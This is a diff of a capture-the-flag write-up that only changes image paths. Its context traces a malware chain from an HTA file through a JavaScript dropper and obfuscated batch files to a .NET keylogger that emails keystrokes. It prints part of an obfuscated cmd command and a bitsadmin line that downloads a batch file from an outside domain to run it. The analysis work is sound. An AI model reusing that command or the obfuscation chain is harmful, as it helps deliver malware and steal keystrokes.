@@ -8,13 +8,13 @@ author = ["connar"]
 # This is a writeup for the babufscation challenge
 This challenge gives us a zip file containing 3 pcap files:  
 
-![alt text](images/image.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image.png)
 
 What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.
 
 We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.   
 
-![alt text](images/image-1.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-1.png)
 
 By doing so, we notice that firstly, an .hta file was downloaded and run. This .hta file probably downloaded the second file which is a javascript file, and this javascript file probably downloaded the last file which is a .bat one.
 
@@ -23,15 +23,15 @@ We can export all the files through File-->Export Objects-->HTTP.
 Let's start analyzing the first file: "noticeJuly.hta"
 Running the file, we are met with the following window:  
 
-![alt text](images/image-3.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-3.png)
 
 Opening the file in a text editor, we observe the following fake looking page:  
 
-![alt text](images/image-2.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-2.png)
 
 We see a very suspicious command that is executed upon clicking the Refresh Button. We can use the CMD Watcher tool (not that it is needed) to see that indeed this sus looking command is being run upon clicking the button:  
 
-![alt text](images/image-4.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-4.png)
 
 Let's analyze this command that is being run. The command is the following:
 ```
@@ -84,15 +84,15 @@ gj4fjrg.run("\"" + whshis4 + "\"");
 This basically makes some replacements in the specified code, decodes the long b64 string and saves it in the appdata folder as a .bat file.
 By following the same operations, we end up with this .bat file:  
 
-![alt text](images/image-5.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-5.png)
 
 This kinda seems like normal envar obfuscation but it is slightly different. It combines multiple known batch obfuscation techniques, such as pre existing envars, custom dictionary etc. One could try to deobfuscate this manually, but there is a twist in this specific batch file. Let's save it and upload it to VirusTotal to see what I mean:  
 
-![alt text](images/image-6.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-6.png)
 
 The thing to take away here is that VirusTotal sometimes will identify known techniques and specify them. Here, we see an interesting text: "BatchEncryption". Let's google this and see what comes up:  
 
-![alt text](images/image-7.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-7.png)
 
 Damn. By opening a few tabs and reading the articles (well, translated except if you know chinese), we learn that this is a tecnhique implemented by a tool named BatchEncryptor which was created by gwsbhqt@163.com.
 There is also the corresponding tool to decode the whole .bat file for us!
@@ -101,7 +101,7 @@ This tool exists in this repo:
 
 By building this tool and running it, we get the deobfuscated bat code which is...another obfuscated command:  
 
-![alt text](images/image-8.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-8.png)
 
 The new command we are called to deobfuscate is:
 ```bat
@@ -110,7 +110,7 @@ cmd /V /C "set shgyngmcqs=0XoY&Ndh%Cas3WlpPRn\meFQwgf/U2D5T:.k tbzri*uMc&&FOR %A
 
 If we read this carefully, we will see that it is not that difficult to deobfuscate. Basically, it just sets a dictionary, then runs a loop and takes a specific character of the corresponding index based on the loop. It recreates the command to be run and then calls it. Let's use python to deobfuscate this:  
 
-![alt text](images/image-9.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-9.png)
 
 Note: The technique used is an existing one and is called "forencoding obfuscation".
 
@@ -121,28 +121,28 @@ bitsadmin /transfer RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU http://sunrizgl3
 
 Bitsadmin command creates jobs and assigns them a task. Here, bitsadmin creates a job named RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU to download a .bat file from a domain, run it, then stop the bitsadmin process in order to delete its logs and then starts it again. We can agree on that the job's name is really sus and if we decode it from b64 we get the first part of the flag:  
 
-![alt text](images/image-10.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-10.png)
 
 Nice. All that's left is the last .bat file in the remaining pcap. 
 Opening it, we get another obfuscated .bat file different than the previous one:  
 
-![alt text](images/image-11.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-11.png)
 
 Again, one can try and deobfuscate it manually, but why not follow up with the same methodology as previously?
 Loading the file in VT, we get another interesting name:  
 
-![alt text](images/image-12.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-12.png)
 
 It is not as easy as with the previous one to indentify the right name, but after a bit of googling we can see that Jlaive is a tool used for obfuscation that gives a matching result as the one we have:  
 
-![alt text](images/image-13.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-13.png)
 
 So basically, Jlaive is a tool used to convert .NET executables to obfuscated .bat files. Interesting. Well, for such a tool to exist, there must be the corresponding tool that does the reverse operation. Searching for a bit, we find a tool named Get-UnJlaive which can be found in the following repo:
 - https://github.com/Dump-GUY/Get-UnJlaive  
 
 This tool reconstructs the original executable before it was converted to this .bat. Setting up the tool and running it, we successfully get an executable back:  
 
-![alt text](images/image-15.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image-15.png)
 
 If we run the file command on the .exe, we see its a Mono/.NET assembly:
 ```sh
@@ -152,7 +152,7 @@ t.bat_orig.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS
 
 Loading the executable to DnSpy, we are met with...another seemingly obfuscated file:  
 
-![alt text](images/image16.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image16.png)
 
 This executable seems to have been packed with some .NET packer. This time, VT won't be of any help to us. We can either identify the packer used by either using a simple strings command which will reveal the path where this executable was stored at build time, or we can search through the functions of the executable and find the packer in the class "cab44dfc2d326bea8c4438eb03ca73b4d":
 ```csharp
@@ -219,12 +219,12 @@ The only thing that is left to do is to find the corresponding tool to deobfusca
 
 Building and running the tool, we get the deobfuscated file:  
 
-![alt text](images/image17.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image17.png)
 
 
 Searching through the deobfuscated methods, we see the executable is basically a keylogger that sends the logged keystrikes through email. In method_4, we can find the part2 of our flag:  
 
-![alt text](images/image18.png)
+![alt text](posts/writeups/ecsc_gr2024/images/image18.png)
 
 
 Full flag: ECSC{477_7h353_ch41nd_73chn1ch35_f02_ju57_4_k3yl09932}
